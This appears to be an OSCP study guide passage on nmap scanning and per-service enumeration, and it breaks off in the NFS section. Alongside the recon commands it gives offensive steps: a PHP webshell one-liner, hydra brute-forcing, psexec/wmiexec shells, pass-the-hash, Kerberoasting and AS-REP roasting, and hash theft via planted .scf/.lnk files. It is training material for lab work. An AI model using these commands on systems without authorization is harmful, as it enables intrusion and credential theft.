# OSCP+ KNOWLEDGE BASE — VOLUME 1
## FINDING OPEN DOORS: SCANNING (NMAP) + ENUMERATING EVERY SERVICE

> **New here? Read this box first — it unlocks every command in this volume.**
>
> **Placeholders you must replace.** Commands use short stand-ins so you can copy them fast. Before anything works you must set the target IP once, and mentally swap the rest:
> ```bash
> export IP=10.10.10.5        # ← run this ONCE per box; now every "$IP" below becomes your target
> mkdir -p scans              # ← make a folder to save scan output into (commands write here)
> ```
> - `$IP` = the target machine's IP address (you just set it above).
> - `$U` = a **username** you found. `$P` = a **password** you found. Type the real value in place of them.
> - `<something>` = "put your own value here" (e.g. `<domain>` = the target's domain name like `corp.local`).
> - `scans/all-tcp.txt` = just a filename to save results into, so you don't lose them.
>
> **The tags.** Each section has a `[TAG]` in square brackets (like `[ENUM-SMB]`). Tags are **bookmarks**: when a line says *"→ `[WEB-QUICK]`"* it means *"go read that section next"* — press **Ctrl+F**, type the tag, jump there. Difficulty labels:
> - `[MUST-MEMORIZE]` = learn it by heart, you'll type it on every box.
> - `[MUST-RECOGNIZE]` = you don't need it memorized, but know what it does when you see it.
> - `[LOOK-UP]` = niche; fine to look up during the exam, don't cram it.
>
> **The golden habit:** *enumerate everything before attacking anything.* Most beginners fail by rushing the first open port. Scan all ports, then look at **every** service, then pick the easiest way in.

---

# [NMAP] SCANNING — finding which doors are open

**What is Nmap?** A port scanner. A "port" is a numbered door on a computer (0–65535); a program listening behind a door is a "service" (web server, file share, database…). Nmap knocks on the doors and tells you which are **open** and what's behind them. This is always your **first step** on a new target.

## [NMAP-QUICK]  the three scans you'll run on every box  (one screen)
```bash
# 1) Fast: knock on ALL 65535 doors, just tell me which are OPEN   [MUST-MEMORIZE]
nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
#    -p-           = scan every port (not just the common 1000)
#    --min-rate 2000 = go fast (send ≥2000 packets/sec); lower to 1000 if results look flaky
#    -Pn           = "assume host is up, skip the ping" (many boxes block ping and look 'down')
#    -oN file      = save a readable copy to that file (ALWAYS save — you'll re-read it)

# 2) Deep: for the ports found open, get the software + version + run default checks   [MUST-MEMORIZE]
nmap -p22,80,445 -sCV -Pn -oN scans/services.txt $IP
#    -p22,80,445   = only the ports step 1 found open (replace with your real list)
#    -sC           = run Nmap's "default scripts" (safe probes that reveal extra info)
#    -sV           = detect the exact service + version (e.g. "Apache 2.4.49") → search it for exploits
#    (-sCV is just -sC and -sV together)

# 3) UDP: a few services only answer on UDP (different protocol) — scan the top ones   [MUST-RECOGNIZE]
nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt $IP
#    -sU           = scan UDP instead of TCP
#    --top-ports 100 = only the 100 most common UDP ports (full UDP is painfully slow)
```
**Read the results like this:**
- Step 1 tells you *which* doors are open. Note every number.
- Step 2 tells you *what program + version* is behind each door → that version is what you search for known exploits.
- Step 3 catches UDP-only services (SNMP on 161, DNS on 53, TFTP on 69) that TCP scans miss.

## [NMAP-TCP]  the standard two-step, explained  [PRACTICAL]
**Why two steps?** Scanning all 65535 ports *with* version detection is very slow. So: **step 1** finds open ports fast (no version detection); **step 2** does the slow version/script work **only** on the handful that were open. Never run `-sCV -p-` together — you'll wait forever.

**The flags that matter (and what each is for):**
- `-p-` → scan all 65535 ports. Without it, Nmap only checks the common 1000 and **misses services on weird high ports** (a very common way beginners miss the way in).
- `--min-rate 2000` → speed. If a box is fragile and results change between runs, drop to `--min-rate 1000`.
- `-Pn` → skip the "is it alive?" ping. Windows and firewalled boxes often block ping and would otherwise be wrongly reported as "down". **Always use `-Pn`.**
- `-sC` (default scripts), `-sV` (versions) → the info that tells you *how* to attack.
- `-oN scans/file.txt` (readable) or `-oA scans/name` (saves 3 formats at once) → **always save output.** You will re-read scans constantly.
- `-T4` → a coarser speed dial; `--min-rate` is the finer control. Either is fine.

**One-command version (fine for a single box, just slower):**
```bash
nmap -p- -sCV -Pn --min-rate 1500 -oA scans/full $IP    # all ports + versions in one go
```
**Faster port discovery (optional tool):** `rustscan -a $IP -- -sCV -oN scans/services.txt` — rustscan finds open ports very fast, then hands them to Nmap. `[LOOK-UP]`

## [NMAP-UDP]  [PRACTICAL]
UDP scanning is slow and unreliable (UDP services often don't reply, so Nmap has to guess). **Scan the top 100–200 UDP ports, never all of them.**
```bash
nmap -sU --top-ports 200 --min-rate 1000 -Pn $IP
```
- `open|filtered` = "no reply, can't tell" — normal for UDP. For a promising one, probe it directly with its own tool.
- **High-value UDP ports to care about:** 161 (SNMP — often leaks creds!), 53 (DNS), 69 (TFTP), 123 (NTP), 500 (IKE/VPN), 137 (NetBIOS).

## [NMAP-SERVICE-ENUM] / [NMAP-SCRIPTS]  running targeted checks  [PRACTICAL]
Nmap ships with hundreds of small scripts (the "NSE"). You can aim specific ones at a service:
```bash
nmap --script "safe or default" -p<ports> $IP          # run all the safe/standard checks
# service-specific bundles:
nmap --script "smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode" -p445 $IP   # SMB
nmap --script "http-enum,http-title,http-headers,http-methods" -p80 $IP                        # web
nmap --script "ftp-anon,ftp-syst" -p21 $IP                                                     # FTP
nmap --script vuln -p<ports> $IP     # broad "any known vulns?" — NOISY, gives false alarms [LOOK-UP]
```
- Treat `--script vuln` as a **lead generator, not proof** — it flags maybes; you still verify by hand.
- Find a script: `ls /usr/share/nmap/scripts | grep <service>`. Read what it does: `nmap --script-help <name>`.

## [NMAP-TROUBLESHOOTING]  when a scan misbehaves
| What you see | Why | What to do |
|---|---|---|
| Every port says "filtered" | A firewall is dropping your probes, or ping is blocked | Add `-Pn`; lower `--min-rate`; try `-sT` (full-connect scan), especially through a proxy |
| Host reported "down" but the website loads | Ping (ICMP) is blocked | Always use `-Pn` |
| Version looks wrong / "unsure" | The service hides its banner | Probe by hand (`nc`, `curl`, the service's own client); add `--version-intensity 9` |
| Scan is crawling | UDP, or too-high rate on a lossy link | UDP: top-ports only. TCP: `--min-rate 1000` |
| Fails through proxychains | SOCKS proxies can't carry raw SYN/UDP packets | Use `-sT -Pn` (TCP connect) only; no UDP over a proxy |
| Different results each run | Rate too high, packets getting dropped | Lower `--min-rate`, run again |
| Box is clearly up but almost everything is "filtered" | possible **port knocking** (a service opens only after you connect to a secret sequence of ports first) | look for the knock sequence in a config/README/comment you looted; then `for p in 7000 8000 9000; do nmap -Pn -p $p $IP; done` and re-scan — the hidden port opens |

**Time-wasters to avoid (rabbit holes):** believing `--script vuln` without checking; obsessing over a single "filtered" port; running full UDP `-p-`; fussing over exact OS-detection guesses.

---

# ENUMERATING EACH SERVICE — what to do behind every open door

> For each service: **what it is** (plain English) → **commands** (every line commented) → **what to check, what can go wrong, and where it leads.** Jump straight to the port you found open using the decision table at the bottom (`[ENUM-DECISION]`).

## [PORT-PLAYBOOK]  the ports to recognise on sight + your FIRST move
When nmap comes back, don't panic at the list — recognise each port and reach for its first move. **Attack priority: web (80/443) → SMB (445) → AD (88/389) → databases → the rest.**

| Port(s) | Protocol / service | What it is (plain English) | Your FIRST move | Jump |
|---|---|---|---|---|
| 21 | FTP | file transfer, often **anonymous** | try `anonymous`/any-pass; download everything; can you upload? | `[ENUM-FTP]` |
| 22 | SSH | remote login shell | note the version; only useful with a **found** password/key (don't brute) | `[ENUM-SSH]` |
| 23 | Telnet | ancient cleartext login | grab banner; try creds you have | `[ENUM-UNUSUAL-PORTS]` |
| 25/465/587 | SMTP | mail | enumerate **usernames** (`VRFY`, `RCPT`) → feed AD attacks | `[ENUM-SMTP]` |
| 53 | DNS | name lookups | attempt a **zone transfer**; on AD it reveals DCs | `[ENUM-DNS]` |
| 80/443/8080/8000 | HTTP(S) | ⭐ a **website** — #1 foothold | enumerate FULLY: `whatweb`, dir-brute, **version→exploit** | `[WEB-QUICK]` |
| 88 | Kerberos | AD authentication | 🚨 **it's a DOMAIN CONTROLLER** — switch to AD mode | `[ENUM-KERBEROS]` / `[AD-QUICK]` |
| 110/143 | POP3/IMAP | mailboxes | test found creds; read mail for secrets | `[ENUM-UNUSUAL-PORTS]` |
| 111 | RPCbind | Unix RPC → points to NFS | `showmount -e` to find NFS exports | `[ENUM-NFS]` |
| 135 | MSRPC | Windows RPC | `rpcclient -U '' -N` null session → users | `[ENUM-RPC]` |
| 139/445 | SMB | ⭐ Windows file sharing | `nxc smb`; try **null session** shares/users | `[ENUM-SMB]` |
| 161 (UDP) | SNMP | device monitoring | `snmpwalk -c public` → **creds in process args** (easy win) | `[ENUM-SNMP]` |
| 389/636/3268 | LDAP | the AD directory | anonymous bind dump; passwords hide in `description` | `[ENUM-LDAP]` |
| 623 (UDP) | IPMI | server management | dump the **pre-auth hash** → crack it | `[ENUM-IPMI]` |
| 631 | CUPS/IPP | Linux printing | CVE-2024-4717x → unauth RCE (niche/recent) | `[ENUM-CUPS]` |
| 1433 | MSSQL | MS SQL Server database | creds → `xp_cmdshell` **RCE** | `[ENUM-MSSQL]` |
| 1521 | Oracle | Oracle database | SID-guess → default creds (`scott/tiger`) → RCE | `[ENUM-ORACLE]` |
| 2049 | NFS | Unix file shares | mount it; **`no_root_squash`** → root | `[ENUM-NFS]` |
| 3306 | MySQL | database | try `root`/blank; `FILE` priv → read/write files | `[ENUM-MYSQL]` |
| 3389 | RDP | remote desktop (GUI) | test creds → `xfreerdp` login | `[ENUM-RDP]` |
| 5432 | PostgreSQL | database | try `postgres`/blank; `COPY ... PROGRAM` → RCE | `[ENUM-POSTGRES]` |
| 5900 | VNC | remote desktop | auth-bypass / crack the VNC password / connect | `[ENUM-VNC]` |
| 5985/5986 | WinRM | remote PowerShell | `nxc winrm` creds → `evil-winrm` **shell** | `[ENUM-WINRM]` |
| 6379 | Redis | in-memory DB, **often no auth** | connect; write a webshell / SSH key | `[ENUM-REDIS]` |
| 27017 | MongoDB | NoSQL DB, often no auth | dump collections → creds/tokens | `[ENUM-MONGODB]` |
| 2375/2376 | Docker API | container engine | unauth API → **host root** | `[ENUM-DOCKER]` |
| 4505/4506 | SaltStack (salt-master) | config-mgmt over ZeroMQ — runs as **root** | CVE-2020-11651 → unauth RCE = **instant root** | `[ENUM-SALTSTACK]` |

**The instant "tells" — train these gut reactions:**
- **Port 88 open → it's a Domain Controller → go AD** (BloodHound, roasting, spraying).
- **445 with `signing:False` → NTLM relay is possible** (lab only; poisoning is banned on the exam).
- **Anonymous FTP / null SMB / world-readable NFS → free files — loot them first.**
- **A database port (1433/3306/5432) + a credential → usually the fastest RCE.**
- **A version number on ANY service → `searchsploit` / CVE it immediately** (`[EXPLOIT-RESEARCH]`).
- **161 SNMP → `snmpwalk` is a low-effort credential jackpot** (passwords in process arguments).
- **Lots of high ports 49152+ on Windows → normal RPC plumbing, ignore them.**

**Golden habit:** the open ports are a **menu, not a checklist in order** — enumerate them all, then attack the *easiest* win first (web, SMB, or a known-version exploit).

## [ENUM-FTP]  Port 21 — FTP (file transfer) — FULL CHAIN
**What it is:** file upload/download. Goldmine when **anonymous** login is allowed. Three things decide everything: (1) can you log in? (2) can you **read** files? (3) can you **write** files? Plus the **version** (some have public exploits).

### 🗺️ Decision tree
```
nmap ftp-anon →  anonymous allowed?   YES → log in → can you WRITE (put)?
                                              ├─ write + it's the WEB ROOT → upload a webshell → RCE
                                              ├─ write (ProFTPD mod_copy) → copy a shell into web root
                                              └─ read-only → LOOT everything → reuse creds
                 NO  →  check the VERSION → public exploit?  (vsftpd 2.3.4 backdoor / ProFTPD mod_copy / CVEs)
                        else → try found/default creds → else brute (last resort, with a known user)
ALWAYS: loot every file you can read; every cred found → spray everywhere.
```

### Step 1 — Identify (version + anonymous)
```bash
nmap -p21 -sCV --script "ftp-anon,ftp-syst,ftp-bounce" $IP    # version + anon + system type
nc -nv $IP 21                                                  # banner by hand (exact version string)
```
- Note the **exact version** (e.g. `vsftpd 3.0.3`, `ProFTPD 1.3.5`) → Step 4 if no anon.
- `ftp-anon: Anonymous FTP login allowed` → Step 2.

### Step 2 — Log in (anonymous first — cheapest)
```bash
ftp $IP                                   # user: anonymous   pass: anonymous (or just Enter)
# non-interactive:
curl ftp://$IP/ --user anonymous:anonymous             # list root
wget -r --no-passive ftp://anonymous:anonymous@$IP/    # MIRROR everything recursively
```
Inside the `ftp>` prompt: `ls -la`, `cd`, `get <file>`, `binary` (before getting binaries or they corrupt), `mget *`.

### Step 3 — Decide by what you can do
**3a. Can you WRITE?** (the big win) — test it:
```bash
# in ftp:  put /etc/hostname test.txt    → "226 Transfer complete" = you can WRITE
```
- **Write + FTP root == web root** (confirm: is there a web server, does `http://$IP/test.txt` show it?) → **upload a webshell**:
  ```bash
  # make shell.php  <?php system($_GET['c']); ?>  → put shell.php → visit http://$IP/shell.php?c=id → [WEB-UPLOAD]
  ```
- **Write but NOT web root** → drop an `.ssh/authorized_keys` if the FTP user's home is writable, or just stage files.

**3b. Read-only?** → **LOOT everything** and move the creds elsewhere:
```bash
# hunt in what you downloaded:
grep -rniE 'pass|pwd|user|secret|key|token' .        # in the mirrored files
# juicy files: config.*, web.config, .env, wp-config.php, *.bak, backups, .txt notes, source, id_rsa, .kdbx
```
Any cred/key found → `[CREDENTIALS-QUICK]` (try on SSH/SMB/web/etc.).

### Step 4 — No anonymous → version exploits + creds
```bash
searchsploit <product> <version>         # e.g. searchsploit proftpd 1.3.5
```
Known OSCP-relevant FTP bugs:
- **vsftpd 2.3.4** → backdoor: a username ending in `:)` opens a **root shell on port 6200** → `nc $IP 6200` → `id`. (`[ENUM-SALTSTACK]`-style CVE entry: CVE-2011-2523)
- **ProFTPD 1.3.5** → `mod_copy` (`SITE CPFR`/`SITE CPTO`, unauthenticated) → copy a file into the **web root** → webshell. (CVE-2015-3306)
- **ProFTPD 1.3.3c** → backdoor. · **Pure-FTPd/others** → check searchsploit.
- No exploit → try creds you found elsewhere, default creds (`admin/admin`, product defaults), THEN brute as last resort:
  ```bash
  hydra -l <known-user> -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 4   # only with a real username + reason
  ```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| downloads corrupt / truncated | type `binary` before `get` |
| `ftp` hangs on listing | passive/active mismatch → `passive` in the prompt, or `wget --no-passive` |
| anon "530 Login incorrect" | anon disabled → version exploit / found creds |
| `put` → "550 Permission denied" | read-only → loot path (3b) |
| can write but webshell 404 | FTP root ≠ web root → stage SSH key / just loot instead |

**Leads to:** webshell → `[WEB-UPLOAD]`; creds/keys → `[CREDENTIALS-QUICK]`; version backdoor → shell → `[LINUX-PRIVESC]`.

## [ENUM-SSH]  Port 22 — SSH (remote login shell)
**Big idea:** SSH is almost never the way *in* — it's the **reward**. You rarely break SSH directly; instead you find a password or a private key *somewhere else* (a file, a share, a database) and then log in with it. Don't waste time attacking SSH head-on.
```bash
nmap -p22 -sCV $IP                         # read the version banner (hints at the OS/distro)
ssh $U@$IP                                 # log in with a username + a password you found
chmod 600 id_rsa ; ssh -i id_rsa $U@$IP    # log in with a private KEY file (chmod 600 first, or SSH refuses it)
ssh2john id_rsa > h ; john --wordlist=rockyou.txt h   # key wants a passphrase? crack it (see Volume 3)
hydra -l $U -P rockyou.txt ssh://$IP       # password-guess as a LAST resort — slow and noisy, needs a known user
```
- A **private key** (often a file named `id_rsa`) is like a password-less door key. If you find one, `chmod 600` it (SSH rejects keys that others could read) then log in with `-i`.
- Read `~/.ssh/authorized_keys` and `known_hosts` on any box you get onto — they leak **other usernames and other target machines**.

**Troubleshoot:**
- `Permission denied (publickey)` → wrong key, or wrong username.
- `no matching key exchange/cipher` (very old server) → `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa $U@$IP`

**Where it leads:** a foothold (your first shell) → `[LINUX-PRIVESC-QUICK]` · tunneling through it → `[PIVOT-SSH]`.

## [ENUM-SMTP]  Ports 25/465/587 — Mail (SMTP)
**What it is:** the mail-sending service. For OSCP its main use is **finding valid usernames** — you ask the mail server "does user X exist?" and it tells you. Those usernames feed Active Directory attacks later.
```bash
nmap -p25 -sCV --script "smtp-commands,smtp-enum-users" $IP   # server capabilities + user-guessing
smtp-user-enum -M RCPT -U users.txt -t $IP    # check a list of names against the server [LOOK-UP]
nc $IP 25                                      # talk to it by hand: type  VRFY root  or  RCPT TO:<user>
```
**What to check:** the banner may leak the mail software and an internal hostname. Valid users → feed them into AD spraying/roasting (`[AD-QUICK]`).

## [ENUM-DNS]  Port 53 — DNS (name lookups)  → also `[TECH-DNS]`
**What it is:** the phone book that turns names (`server.corp.local`) into IPs. The jackpot here is a **zone transfer** — if misconfigured, the server hands you a full list of every internal hostname at once. On Active Directory, DNS also reveals the Domain Controllers.
```bash
dig axfr @$IP <domain>                     # ZONE TRANSFER — dumps ALL records at once (the big win)
dig any @$IP <domain>                       # ask for any records it'll share
dig -x $IP @$IP                             # reverse lookup (IP → name)
dnsrecon -d internal.lan -a -n $IP          # automated enumeration (includes the zone-transfer attempt)
dnsrecon -d <domain> -D wordlist.txt -t brute   # guess subdomain names from a wordlist
nslookup -type=SRV _ldap._tcp.<domain> $IP  # AD trick: locate Domain Controllers via SRV records
```
**What to check / do:** **every hostname you discover, add it to your `/etc/hosts`** file (`sudo nano /etc/hosts`, add a line `<IP>  server.corp.local`) so your tools can reach it by name.
**Where it leads:** new website names to fuzz (`[WEB-CONTENT]`) · identifying the DC (`[AD-ENUM]`).

## [ENUM-HTTP] / HTTPS  Ports 80/443/8080/8000/8443/… — Web
**What it is:** a website. This is the **#1 way into most boxes.** Enumerate **every** HTTP port thoroughly — the full method is Volume 2 (`[WEB-*]`). Quick first look:
```bash
whatweb http://$IP        # identify the tech stack (server, CMS, frameworks)
curl -sI http://$IP       # show just the response headers (server type, redirects, cookies)
# then: view page source · read /robots.txt · brute-force hidden directories · brute-force vhosts
```
**Look for:** the CMS and its version (→ search for exploits), any redirect to a hostname (add it to `/etc/hosts`, then fuzz it as a "vhost"), login pages, file-upload pages, and URL parameters (`?id=1`) to test for injection.
**Where it leads:** SQL injection / file inclusion / file upload / command injection / a known-version exploit → your first shell. **Start at `[WEB-QUICK]` in Volume 2.**

## [ENUM-SMB]  Ports 139/445 — SMB (Windows file sharing)  → also `[TECH-SMB]`
**What it is:** Windows file-and-printer sharing. On a Windows/AD network it's the workhorse: you can sometimes list shared folders and usernames **without any password** ("null session"), test whether creds work, move between machines, and loot files left in shares.

### [SMB-QUICK]  first look  (one screen)
```bash
nxc smb $IP                              # basic info: OS, hostname, domain, signing   [MUST-MEMORIZE]
nxc smb $IP -u '' -p '' --shares         # try to list shared folders with NO credentials (null session)
nxc smb $IP -u 'guest' -p '' --shares    # fallback: try the "guest" account
enum4linux-ng -A $IP                     # throw everything at it automatically (users, shares, policy)
smbclient -N -L //$IP/                   # another way to list shares with no creds (-N = no password)
smbclient -N //$IP/<share>               # connect INTO a share; then use: ls, get <file>, recurse ON
```
> **What is `nxc`?** `nxc` (NetExec, formerly CrackMapExec/`cme`) is a Swiss-army knife for Windows protocols (SMB, WinRM, LDAP, MSSQL…). You'll use it constantly. `smbclient` is a simpler one-share file browser.

**Look for:** `signing:False` (means NTLM-relay attacks are possible), folders you can **read** or **write**, usernames, and the domain name. **Next:** read every readable share; try any found password on other accounts.

### [SMB-ENUM]  deeper enumeration
```bash
nxc smb $IP -u '' -p '' --shares --users     # null session: list shares AND users
nxc smb $IP -u guest -p '' --shares          # guest fallback
nxc smb $IP -u '' -p '' --rid-brute          # pull usernames by cycling ID numbers (works with no creds)
smbclient -N //$IP/Share                      # browse a share; inside: 'recurse ON', 'prompt OFF', then 'mget *'
mount -t cifs //$IP/Share /mnt/s -o username=$U,password=$P   # mount a share locally so you can grep it [LOOK-UP]
nxc smb $IP -u $U -p $P --shares --users --pass-pol --groups  # with creds: full enumeration
nxc smb <hosts.txt> -u users.txt -p 'Password1' --continue-on-success   # spray ONE password at many users/hosts
nxc smb $IP -u $U -H <ntlmhash>              # log in with a HASH instead of a password ("pass-the-hash")
nmap --script smb-vuln-ms17-010 -p445 $IP   # check for EternalBlue (old, unpatched Windows)
```
> **"Spraying"** = trying one likely password against many usernames (safer than hammering one user, which can lock the account). **"Pass-the-hash"** = Windows lets you authenticate with the password's *hash* (a scrambled fingerprint) even if you never cracked the actual password.

**Files worth grabbing from shares:** `Groups.xml` / GPP files (contain an encrypted-but-crackable `cpassword`), login scripts, `web.config`, `unattend.xml`, backups, `.kdbx` (KeePass), `.ps1` scripts, sticky-notes.
**Common misconfigs:** null/guest read access · a **writable** share (drop a `.scf`/`.lnk` file to steal a hash) · SMB signing off (relay attacks).
**Known vulns:** MS17-010 "EternalBlue" (old boxes) · GPP `cpassword`.

### [SMB-ATTACK]  turning SMB access into a shell
```bash
impacket-psexec $U:$P@$IP        # get a SYSTEM shell using ADMIN creds — reliable but "loud"
impacket-wmiexec $U:$P@$IP       # run commands more quietly (no service created)
nxc smb $IP -u $U -p $P -x whoami   # run a single command and see the output
# writable share → drop a malicious .scf/.url/.lnk, run Responder/ntlmrelayx to catch the hash [LOOK-UP]
```
See `[AD-LATERAL]` (Volume 5) for the full "move to another machine" menu.

### [SMB-TROUBLESHOOTING]
| What you see | Meaning / fix |
|---|---|
| `NT_STATUS_ACCESS_DENIED` when listing | null session is disabled → you need real creds |
| `STATUS_LOGON_FAILURE` | wrong creds — check the domain: add `-d DOMAIN` or use `-u DOMAIN/user` |
| `STATUS_ACCOUNT_RESTRICTION` | that account isn't allowed to use SMB / only on certain hosts |
| smbclient: "protocol negotiation failed" | ancient SMBv1 → `smbclient --option='client min protocol=NT1'` |
| `STATUS_NOT_SUPPORTED` | SMBv1 disabled (fine) → use nxc / SMB2 |
| Kerberos "clock skew" errors | your clock differs from the DC → `sudo ntpdate $IP` |

**Where it leads:** creds, loot, moving laterally, and full AD enumeration → `[FOUND-SMB]`, spray creds, `[AD-ENUM]`.

## [ENUM-RPC]  Port 135 (Windows RPC) / Port 111 (Unix RPC)
**What it is:** 135 is a Windows service that can leak **users and domain info** (sometimes when SMB won't). 111 is the Unix "portmapper" that points you to **NFS** file shares.
```bash
rpcclient -U '' -N $IP     # connect with no creds; then type: enumdomusers / enumdomgroups / queryuser 0x<rid> / srvinfo
impacket-rpcdump $IP       # list the available RPC services
rpcinfo -p $IP             # Unix side (111): what RPC services exist
showmount -e $IP           # Unix side: list NFS exports (shared folders)
```
**Where it leads:** usernames (→ spray/roast), NFS shares to mount.

## [ENUM-LDAP]  Ports 389/636/3268/3269 — LDAP (the AD directory)  → `[AD-ENUM]`, `[TECH-LDAP]`
**What it is:** the Active Directory database, queried over the network. An "anonymous bind" (no login) can sometimes dump all users, computers, and their **descriptions** — and admins sometimes stash **passwords in the description field**.
```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts     # find the "base DN" (e.g. dc=corp,dc=local) — you need this
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local"      # anonymous dump: users, descriptions (creds!), computers
ldapsearch -x -H ldap://$IP -D '$U@corp.local' -w '$P' -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName description   # with creds
nxc ldap $IP -u $U -p $P --users --groups --asreproast asrep.txt --kerberoasting kerb.txt   # users + build roast target lists
ldapdomaindump -u 'corp.local\$U' -p $P $IP            # dump everything to browsable HTML/JSON
```
> `-x` = simple auth, `-H` = the server URL, `-b` = the "base DN" (where in the tree to start — get it from the first command). The **base DN** is just the directory's root path, written like `dc=corp,dc=local` for the domain `corp.local`.

**Where it leads:** full AD enumeration, passwords in descriptions, Kerberoast/AS-REP target lists, and data to feed BloodHound (`[AD-BLOODHOUND]`).

## [ENUM-KERBEROS]  Port 88 — Kerberos (AD login system)  → `[AD-KERBEROAST]`, `[AD-ASREP]`
**What it is:** the authentication system Active Directory uses. **The moment you see port 88 open, this machine is a Domain Controller — switch your whole mindset to "this is AD."**
```bash
sudo ntpdate $IP     # FIRST fix the clock (Kerberos fails if your clock differs from the DC's)
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP   # AS-REP roast: grab crackable hashes with NO creds
impacket-GetUserSPNs -request <domain>/$U:$P -dc-ip $IP                   # Kerberoast: grab crackable hashes with ANY one cred
```
> **AS-REP roasting** = some accounts are misconfigured so anyone can request a chunk of crackable data (a "hash") for them, no login needed. **Kerberoasting** = with *any* valid account you can request crackable hashes for service accounts. Both hashes get cracked offline in Volume 3.

**Where it leads:** crackable hashes → passwords, and confirmed usernames → `[AD-QUICK]`.

## [ENUM-WINRM]  Ports 5985/5986 — WinRM (remote PowerShell)  → `[TECH-WINRM]`
**What it is:** remote PowerShell access — **if** your account is in the "Remote Management Users" or Administrators group. Once you have working creds, this is a prime way to get an interactive Windows shell.
```bash
nxc winrm $IP -u $U -p $P     # test the creds — if it prints "(Pwn3d!)" you CAN get a shell
evil-winrm -i $IP -u $U -p $P # get the interactive shell (has built-in 'upload' and 'download' commands)
evil-winrm -i $IP -u $U -H <ntlmhash>   # log in with a hash instead of a password
```
> `(Pwn3d!)` in nxc output = "these creds are strong enough to execute here" — a green light.
**Troubleshoot:** nxc validates but evil-winrm fails → the user isn't allowed WinRM. TLS on port 5986 → add `-S`. Kerberos time errors → `ntpdate`.
**Where it leads:** an interactive Windows foothold → `[WINDOWS-PRIVESC-QUICK]`.

## [ENUM-RDP]  Port 3389 — RDP (Remote Desktop, the GUI)  → `[TECH-RDP]`
**What it is:** full graphical remote desktop. With valid creds you get a Windows desktop; very old versions have the risky "BlueKeep" exploit (rarely needed).
```bash
nxc rdp $IP -u $U -p $P                                       # test whether the creds work for RDP
xfreerdp /v:$IP /u:$U /p:$P +clipboard /dynamic-resolution    # connect to the desktop   [MUST-RECOGNIZE]
xfreerdp /v:$IP /u:$U /pth:<ntlmhash>                         # pass-the-hash (needs "Restricted Admin" mode)
xfreerdp /v:$IP /u:$U /p:$P /drive:share,/tmp                 # share your /tmp into the session to move files
```
**Where it leads:** a graphical foothold — handy for running winPEAS visually or moving files via clipboard/mapped drive.

## [ENUM-SNMP]  Port 161/UDP — SNMP (device monitoring) — FULL CHAIN  → `[TECH-SNMP]`
**What it is:** a monitoring protocol on **UDP 161** (so a TCP scan misses it — you need `-sU`). Guarded by a "community string" (a shared password); the default is `public`. If you can read it, it dumps **running process command-lines (passwords hide here!), users, installed software, listening ports, network info** — huge loot for near-zero effort.

### 🗺️ Decision tree
```
is 161/udp open? (nmap -sU) →  guess community string ('public' first, then brute)
   got a string? →  snmp-check / snmpwalk EVERYTHING →  mine for:
      ├─ process ARGUMENTS   → passwords typed on command lines  → reuse (SSH/web/etc.)
      ├─ usernames           → build a user list → spray / AD roast
      ├─ listening ports     → internal-only services → pivot targets
      └─ installed software  → version → searchsploit
   no string → brute harder (onesixtyone + big list); if still nothing, move on (low-value then)
```

### Step 1 — Confirm it's there (UDP!) + find the community string
```bash
nmap -sU -p161 -sV $IP                                   # is 161/udp open + version
# try the default, then brute the string:
snmpwalk -v2c -c public $IP 2>/dev/null | head           # 'public' works? (no output = wrong string/filtered)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP   # brute the string
snmpbulkwalk -v2c -c public $IP 1.3.6 | head             # faster bulk walk
```
- Got output → you have a valid string → Step 2.
- `public` fails → brute with onesixtyone; common ones: `public`, `private`, `community`, `manager`.

### Step 2 — Dump EVERYTHING, then mine it
```bash
snmp-check $IP -c public                                 # cleanest formatted dump (START HERE)
snmpwalk -v2c -c public $IP > snmp.txt                   # full raw dump to a file
# then mine the file / targeted OIDs:
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2       # running processes
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.5       # ⭐ process ARGUMENTS — passwords live here
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2       # installed software (→ searchsploit)
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25        # local user accounts
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3         # listening TCP ports (internal services)
grep -iE 'pass|pwd|user|cred|key' snmp.txt               # quick creds sweep
```
> An **OID** = an "address" for a specific data branch. `snmp-check` already pulls the common ones; the targeted walks are for when you want just processes/args.

### Step 3 — Act on what you found
- **Password in a process arg** (e.g. a backup/db command with `-p<pass>`) → reuse it on SSH/SMB/web → `[CREDENTIALS-QUICK]`.
- **Usernames** → save to `users.txt` → spray, or AD roast (`[AD-QUICK]`).
- **Installed software + version** → `searchsploit <product> <version>`.
- **Internal listening ports** (127.0.0.1 only) → pivot targets once you have a foothold (`[PIVOT-QUICK]`).

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| nothing from `snmpwalk` | wrong community string (brute with onesixtyone) OR 161 is filtered — confirm with `nmap -sU -p161` |
| TCP scan didn't show 161 | SNMP is **UDP** → `nmap -sU --top-ports 100` |
| `Timeout: No Response` | string wrong, or rate-limited → `-t 5 -r 2`; try `-v1` as well as `-v2c` |
| snmpwalk slow | use `snmpbulkwalk` |
| SNMPv3 (no community string) | needs a user+auth → harder; look for creds elsewhere `[LOOK-UP]` |

**Leads to:** creds in process args → spray `[CREDENTIALS-QUICK]`; user list → `[AD-QUICK]`; software version → `[EXPLOIT-RESEARCH]`.

## [ENUM-NFS]  Port 2049 (+111) — NFS (Unix file sharing) — FULL CHAIN  → `[TECH-NFS]`
**What it is:** Unix network file shares ("exports"). Two wins: (1) **read/loot** files on the share (creds/keys/source), and (2) if **`no_root_squash`** is set, a direct path to **root**.

### 🗺️ Decision tree
```
showmount -e → exports listed? →  mount one →  can you READ it? →  LOOT (creds, id_rsa, source, configs)
                                              can you WRITE it? →  check the export option:
     ├─ no_root_squash  → ⭐ SUID-root binary trick → ROOT (you're root on the mount)
